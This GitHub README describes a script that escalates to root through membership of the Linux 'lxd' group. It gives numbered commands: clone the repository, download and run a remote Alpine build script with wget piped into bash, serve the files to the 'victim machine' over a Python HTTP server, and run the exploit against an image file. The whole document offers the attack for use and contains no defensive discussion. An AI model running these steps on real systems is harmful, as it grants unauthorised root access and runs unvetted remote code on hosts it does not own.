# lxd-group-privilege-escalation
Script to elevate your privilege if you are in the group 'lxd'.

## How to execute
1 -> Clone this repository with: ```git clone https://github.com/David132435/lxd-group-privilege-escalation/tree/main```  
2 -> Navigate to the folder: ```cd lxd-group-privilege-escalation```  
3 -> Give the script execute permission: ```chmod +x lxdprivesc.sh```  
4 -> Execute the script and see help: ```./lxdprivesc.sh```

![image](https://github.com/David132435/lxd-group-privilege-escalation/assets/106914229/195d49bb-a0b2-4cb4-9216-186d0f16e5cd)

5 -> Check how to build alpine image: ```./lxdprivesc.sh --howto```

![image](https://github.com/David132435/lxd-group-privilege-escalation/assets/106914229/5c8f46eb-31c1-4b56-8c93-476f5b58ec0f)

6 -> Follow the steps and execute on your local machine: ```wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine && bash build-alpine```  
7 -> Transfer the script and the alpine image to the victim machine (you can start a http server with ```python3 -m http.server 80```)

![image](https://github.com/David132435/lxd-group-privilege-escalation/assets/106914229/56a68c4f-d412-4650-81b0-ecc929ced863)

8 -> Give the script execution permission with ```chmod +x lxdprivesc.sh```

![image](https://github.com/David132435/lxd-group-privilege-escalation/assets/106914229/45a00e9f-d4e7-412a-9e8c-a2c5c2167f75)

9 -> Execute the script with ```./lxdprivesc.sh -f alpine.tar.gz```

![image](https://github.com/David132435/lxd-group-privilege-escalation/assets/106914229/4608bbe2-0f9b-4d1e-841d-83e2562245ad)

10 -> Enjoy! 😊
-----------------------------
(Tested on Ubuntu 22.04)
